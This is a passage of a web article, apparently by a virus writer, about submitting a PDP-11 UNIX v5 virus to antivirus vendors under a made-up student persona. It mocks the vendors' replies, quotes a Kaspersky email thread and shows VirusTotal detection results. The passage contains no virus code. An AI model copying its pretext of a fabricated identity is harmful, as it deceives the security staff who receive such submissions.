+	Symantec &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="eb8a9d989e8986829fab9892868a859f8e88c5888486">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Tauscan &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cebabca1a4afa0bd8eafa9a0a7babba3e0ada1a3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	TrendMicro &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ed9b849f989eb289828e99829fad999f88838980848e9f82c38e8280">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	UNA &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bdd3d8cacbd4cfc8cefdc8d3dcced2dbc993ded2d093c8dc">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	VBA32 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d8b6bdafaeb1aaadab98b9b6acb1f5aeb1aaadabf6baa1">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	VirusBuster &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0f79667d7a7c4f79667d7a7c6d7a7c7b6a7d21677a">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>
+Date: Oct 6, 2006 5:06 PM
+Subject: Need help on virus
+
+   Dear kind sirs,
+
+   I very need information from professionals on computer viruses.
+
+   My  name  is Digamber Mayur, I am graduate student and also working as
+   an  assistant  in  my  spare  time.  Not  so  long  ago  I received an
+   assignment to prepare the disk images with the programming environment
+   for  the  UNIX  v5  operating system for the practical work within the
+   course  on  computer architectures. It was intended to run in the SIMH
+   simulator of the DEC PDP-11 computer.
+
+   I   successfully   downloaded   and   installed  the  simulator  (from
+   http://simh.  trailing-edge.com/),  the  image  of the root filesystem
+   (from       the       PUPS      archive      ftp://sunsite.icm.edu.pl/
+   pub/unix/UnixArchive/PDP-11/  Distributions/research/Dennis_v5/) and a
+   number  of  tools  both  in  binary  and  source form from the various
+   sources.  After some time I noticed the significant perfomance degrade
+   of the simulated system and also some unexpected crashes.
+
+   I spent a lot of time investigating the reasons of such anomalities in
+   the behaviour of the system and it seems that by pure luck I found it.
+   I  compiled  a  trivial  program  (its  only  goal is to to output the
+   message  on the terminal) and by accident noticed that the size of the
+   program  was increased after I stripped the symbol information. That's
+   how  I first discovered that the image prepared by me is infected with
+   some virus.
+
+   When,  I  compared  a number of files in the "/bin" directory with the
+   same  files in the original archive "v5root.gz" and saw the difference
+   in  size,  to  be precise the difference is 192 bytes. It seems that a
+   lot  of  executable  files  with  the  magic  0407 being infected. For
+   unknown reasons the virus won't infect the 0410 files.
+
+   I  was really sadden and surprised by all that. I don't know what type
+   of virus it is, and where it came from (may be it already was there on
+   those  restored  DEC  tapes,  covertly placed in the software), but it
+   seems that I have to start my work from scratch, now.
+
+   It  is  extremely  annoying that as a user I should protect myself not
+   only  from  the  modern  threats, but also from the things that to the
+   moment  are nearly forgotten. To my regret I have no enough experience
+   to analyze this virus, and may be it is already kmown? The UNIX system
+   I  work  with  was  one  of  the  first and is dated in the archive by
+   1974-1975.  So, may be the virus that hit me also the one of the first
+   of  its  kind?  May  you  tell me something about it? Is it a Brain or
+   Jerusalem virus or something like that?
+
+   There  are transcripts of the terminal sessions, dumps of the infected
+   programs  (made  with  od tool), infected and original programs in the
+   binary,  source  and disassembly form (prepared with pdp11dasm) in the
+   attachment.
+
+   Thank  you  very  much  for  your  time. I am looking forward for your
+   reply.
+</pre>
+<p>Literally, within several seconds he got auto-replies from Symantec (saying that since archive has more than ten files it will not be analized due to high pressure on support), McAfee (they checked the archive and since they didn't found any virus, they suggested to resend the files in the password protected archive. What a bright idea to deal with unknown viruses in such a way!), Authentium, Inc. (yes, finally, short and clean receipt stating that the message was accepted and will be analyzied), VirusBuster (receipt with ticket id and a link to the page saying "HIBA: nnek nincs megfelel jogosltsga az oldalhoz." it's a pity, but nor Digamber, neither his fellow herm1t doesn't understand the hungarian) and at last the receipt from Dr. Web with ticket id, explanation how to use it and, for some purpose, the quoted message. The rest thirty companies didn't even bothered to notify the sender that his message was received.</p>
+<h3>Forty Little Avers</h3>
+<p>Michael Kharlamov from Dr.Web gave up first. After two hours I received the reply: "We does not support DEC PDP-11 systems." Forty little avers view the code of mine. One saw <del>a new</del> an old platform then there were thirty nine.</p>
+<p>L. Clark from AVERT replied with "I am forwarding your samples to a Senior Virus Research Engineer for further review." Wow! "Senior Virus Research Engineer" all capitals. Who ever would have thought it! No reply yet. Thirty nine dumb asses ask to call them later. One forwarded the mail forth and then there were thirty eight.</p>
+<p>The reply from Symantec mottoed this chapter. Thirty eight of virus labs are mostly robot driven. One missed all including names and then there were thirty seven.</p>
+<p>Three of mighty avers already rest in piece. Avira asked for some more time then there were thirty six.</p>
+<p>CA eTrust Antivirus Research and Response Group after seven days of hard work came to the conclusion that: "All files you sent are clean." While you are protected by CA - ALL YOUR BASE ARE BELONG TO US! Thirty six "researches" dug a virus hive. One thought that the file was clean then there were thirty five.</p>
+<p>David Rohlik from AVG Technical Support decided that "The files you have sent us are not virus. They are source codes and comments for some kind of program." Bravo, David! Thirty five crystal-gazers had never failed before. One guessed: "It's the source!" then there were thirty four.</p>
+<p>Thirty lazy avers treat all mail as SPAM. Since last of them was <a href="#kav">Kaspersky</a> then there were less than none.</p>
+<p>AVers from 34 to 31 falls to the special case.</p>
+<h3>The last hope: ArcaBit, VirusBuster, FortiNet and ALWIL</h3>
+<p>In the beginning I was thinking that I provided <em>too much</em> information, I thought that even blind and mentally challenged person will see that the samples are infected. I was naive. After I received the disasterous replies, I was agreeably disappointed by answers from Kamil Konieczny (ArcaBit), Ferenc L&aacute;szl&oacute; (VirusBuster), Pavel Cimbal (ALWIL Software) and some person at FortiNet who at last provided descriptions and even tried to add the detection routines to their products.</p>
+<p>But even them did a mistakes. Ferenc wrote:</p>
+<blockquote>[...] Original entry 4 bytes are preserved at the very end of the infected file. When the virus finished, it restores the original code in memory, and starts it.</blockquote>
+<p>Wrong. The virus restores the victim even before it opens the current directory. Kamil supposed the same:</p>
+<blockquote>[...] and at end of execution restore original instruction at offset 0020 and jump to 0020 (this is how old COM viruses works, of course there are some variations with that) Jump can be made by 'ret' instruction or in some other machine dependent way, or original program can be ignored and never executed.</blockquote>
+<p>Ah, those old good days of DOS, how deep they formatted the brains of both avers and vxers! Who tell them that it is neccessary for the virus to restore the victim at the end of execution? "ret" command. hemmer.</p>
+<p>Pavel wrote that "it seems to be a kind of a link-virus". Hm, to me it seems that the ALWIL is a kinda of anti-virus program which might catch some virus. With a bit of luck.</p>
+<p>By the way, there are nobody at FortiNet who can convert octal to binary:</p>
+<blockquote>May we request that the original infected binary files be sent instead of the octal dumps.</blockquote>
+<p>They also missed everything that could be missed (just look at their mails), but after all they added the detection of the virus. Sorry, the detection for the two infected files which were sent. By checksum, I guess. But even this excuses them a llitle in comparison with the rest.</p>
+<p>Postflight analysis is over. Make your choice. Personally, I wish to thank Kamil and Ferenc. They even tried.</p>
+<p>Others behave like a monkey crowd typing, and typing, and typing yet another definition for the next in series of Trojan.Huy.zzzz with groundless hope that some day all this garbage will become an anti-virus silver bullet. It's clearly shows their inability to face something new and unexpected. Poor monkeys...</p>
+<p>It seems that on the long way from "amateurs" to "professionals" the AV-people (excluding some very few exceptions) have lost the very important ability. It is an ability to learn something new, to wonder at unexpected things, the interest to the work they are doing. They call themselves researches, but now their research field is the diagrams presented by sales dep.</p>
+</div>
+<div id="kav" class="content">
+<h2>How many virus analysts does it take to <del>catch a virus</del> screw in a light bulb?</h2>
+<p>Especially if all of them are working for Kaspersky Lab, <q>a leading developer of secure content management solutions</q>? You probably won't believe me, but three, not including a monkeys from reception, cock-eyed mail "robot" that "auto-responded" on a next day and stoned tracking system which assign new tasks to each mail in the thread. Their names are: Alexander Markov, Leonid Khovansky and Pavel Zelensky.</p>
+<p>Ah, it slipped from my mind, that after three weeks, when those gentlemen were actually made an attempt to "change the light bulb" (probably, one was going to screw the fucking thing in and the others hold the ladder), they missed it. When they insisted that there is enough light, say, I failed to convince them that there is a virus in the archive. Something got screwed there. (clearly, it has nothing in common with a light bulbs).</p>
+<p>Let me cite the whole thread:</p>
+<div class="mail_header">Digamber Mayur to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="01686f676e416a6072716473726a782f626e6c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (Oct 16, 2006 6:28 PM) Support is dead?</div>
+<blockquote>Ten days ago (to be precise at October 6th and 13th) I sent a (possibly) new virus (from this e-mail address, with subject lines "Need help on virus" and "UNIX virus") to "<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2b454e5c5d42595e586b404a585b4e5958405205484446">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>". I did not received any replies. Is the address I had used for virus submission correct or support just not responding?</blockquote>
+<div class="mail_header"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="48262d3f3e213a3d3b0823293b382d3a3b2331662b2725">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="15717c7274787770673b78746c6067557278747c793b767a78">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (17 Oct 2006 14:45:43 +0400) RE: Support is dead? [KLAB-1295527]</div>
+<blockquote>
+<p>Hi</p>
+<p>address is correct.</p>
+<p>Your letter is probably lost.</p>
+<p>Please send it one more time.</p>
+<div class="sig">
+<p>Regards,</p>
+<p>Alexander Markov</p>
+<p>Virus Analyst, Kaspersky Lab.</p>
+</div>
+</blockquote>
+<div class="mail_header">Digamber Mayur to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ea848f9d9c83989f99aa818b999a8f98998193c4898587">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (Oct 17, 2006 1:35 PM) Re: Support is dead? [KLAB-1295527] 2 attachments: letter.txt (3K), virus_files.zip (14K)</div>
+<blockquote>Here is the mail and the files.</blockquote>
+<div class="mail_header">Digamber Mayur to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="81e8efe7eec1eae0f2f1e4f3f2eaf8afe2eeec">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (Oct 22, 2006 11:19 AM) Fwd: Support is dead? [KLAB-1295527]</div>
+<blockquote>It seems that the only way to contact with "newvirus@" is to send the mail to this address. May you forward it to the people responsible for the new viruses?</blockquote>
+<div class="mail_header">HelpDesk Robot Kaspersky Lab Support to Digamber Mayur (Oct 23, 2006 2:03 PM) RE: Support is dead? [KLAB-1295527]</div>
+<blockquote>
+<p>If you are looking for technical support, please fulfill the submission form at this URL: http://www.kaspersky.com/helpdesk.html</p>
+<p>Your request will be processed via HelpDesk system and immediately delivered to our support team.</p>
+<p>For more information about Technical Support please click on the URL below: http://www.kaspersky.com/support</p>
+<p>Visit our online Knowledge Base (FAQ) to find a solution to your question: http://www.kaspersky.com/faq/</p>
+<div class="sig">
+<p>Regards,</p>
+<p>Kaspersky Lab Team.</p>
+</div>
+</blockquote>
+<div class="mail_header"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a7c9c2d0d1ced5d2d4e7ccc6d4d7c2d5d4ccde89c4c8ca">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="583c313f39353a3d2a763539212d2a183f35393134763b3735">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (28 Oct 2006 05:27:02 +0400) RE: Support is dead? [KLAB-1295527] [KLAB-1295852]</div>
+<blockquote>no comments.
+<div class="sig">
+<p>Regards,</p>
+<p>Leonid Khovansky</p>
+<p>Virus Analyst, Kaspersky Lab.</p>
+</div>
+</blockquote>
+<div class="mail_header">Digamber Mayur to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="82ece7f5f4ebf0f7f1c2e9e3f1f2e7f0f1e9fbace1edef">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (Oct 29, 2006 9:06 AM) Re: Support is dead? [KLAB-1295527] [KLAB-1295852]</div>
+<blockquote>That's all you have to say after three weeks? No comments...</blockquote>
+<div class="mail_header"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4f212a3839263d3a3c0f242e3c3f2a3d3c2436612c2022">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="93f7faf4f2fef1f6e1bdfef2eae6e1d3f4fef2faffbdf0fcfe">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (29 Oct 2006 11:41:02 +0300) RE: Support is dead? [KLAB-1295527] [KLAB-1295852] [KLAB-1330022]</div>
+<blockquote>
+<p>Hello.</p>
+<p>I'm sorry, but what kind of your question?</p>
+<p>Archive, what you sent was clear.</p>
+<p>Do you want any additional comments?</p>
+<div class="sig">
+<p>Sincerely yours,</p>
+<p>Pavel Zelensky</p>
+<p>Virus analyst</p>
+</div>
+</blockquote>
+<div class="mail_header">Digamber Mayur to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e8868d9f9e819a9d9ba883899b988d9a9b8391c68b8785">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (Oct 29, 2006 11:04 AM) Re: Support is dead? [KLAB-1295527] [KLAB-1295852] [KLAB-1330022]</div>
+<blockquote>No, if you think that there is no virus in the archive I have sent, I have no more questions and need no more comments. I already received descriptions of this _virus_ from Arcabit,Alwil and VirusBuster. It is already detected by VirusBuster and Fortinet. So, thank you for your time, I gain the invaluable experience while talking with your support team. The answers came really fast (what is three weeks, between you and me and the lamppost) and were comprehensive and helpful (brevity is the soul of wit and from the two words I received as a reply I made far-reaching conclusions).</blockquote>
+<div class="mail_header"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ec82899b9a859e999fac878d9f9c899e9f8795c28f8381">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dbbfb2bcbab6b9bea9f5b6baa2aea99bbcb6bab2b7f5b8b4b6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (29 Oct 2006 12:32:07 +0300) RE: Support is dead? [KLAB-1295527] [KLAB-1295852] [KLAB-1330022] [KLAB-1330198]</div>
+<blockquote>
+<p>This archive cantain a legal source codes.</p>
+<p>No viruses within it.</p>
+<div class="sig">
+<p>Sincerely yours,</p>
+<p>Pavel Zelensky</p>
+<p>Virus analyst</p>
+</div>
+</blockquote>
+<div class="mail_header">Digamber Mayur to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="69070c1e1f001b1c1a2902081a190c1b1a0210470a0604">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> (Oct 29, 2006 12:03 PM) Re: Support is dead? [KLAB-1295527] [KLAB-1295852] [KLAB-1330022] [KLAB-1330198]</div>
+<blockquote>
+<p>Oh, really? I downloaded the file that I sent to you (from Sent Mail) here is its contents:</p>
+<pre>
+a.out		- Infected "hello" program
+a.out.das	- Disassembly of the above
+a.out.od	- Octal dump
+du		- Infected du program
+du.das		- Disassembly of the above
+du.od		- Octal dump
+du.orig		- Original not infected du program
+du.orig.das	- Disassembly of the above
+du.s		- Source of the du
+hello.s		- Source of the hello
+session1.txt	- Session that shows
+		how the program becomes infected
+session2.txt	- Session that shows
+		how I imported the octal dump into
+		SIMH to prepare the files for submission.
+</pre>
+<p>You might thought that I cannot distinguish between source and executable? Let's see what the file command will say:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9bfff2fcfaf6f9fee9dbeffee8ef">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> tmp]$ file a.out du
+a.out: PDP-11 executable
+du:    PDP-11 executable
+</pre>
+<p>and, at last, check it on virustotal.com:</p>
+<pre>
+Complete scanning result of "du",
+received in VirusTotal at 10.29.2006, 10:57:34 (CET).
+...
+Fortinet        2.82.0.0        10.29.2006      Unix/Malicious
+...
+VirusBuster     4.3.15:9        10.28.2006      Unix.Small.A
+Aditional Information
+File size: 846 bytes
+MD5: c488c4e83959d16a82c57e6bf7aeab86
+SHA1: cd4da88fa683dd33999efe9697ef31178d09f023
+</pre>
+</blockquote>
+<hr/>
+<p>No reply yet.</p>
+<p>There exist the unrenderable russian word to describe the situation, its meaning is similar to "fucking fiasco", but is more expressive. Pizdets!</p>
+</div>
+<div id="tricks" class="content">
+<h2>Tricks of Dawn</h2>
+<h3>Quick notes on PDP-11</h3>
+<div class="epigraph">But the Red Queen looked sulky, and growled 'Pudding -- Alice; Alice -- Pudding. Remove the pudding!' and the waiters took it away so quickly that Alice couldn't return its bow.</div>
+<br clear="right"/>
+<img src="img/PDP-1140.jpg" alt="PDP-11/40" align="left"/>
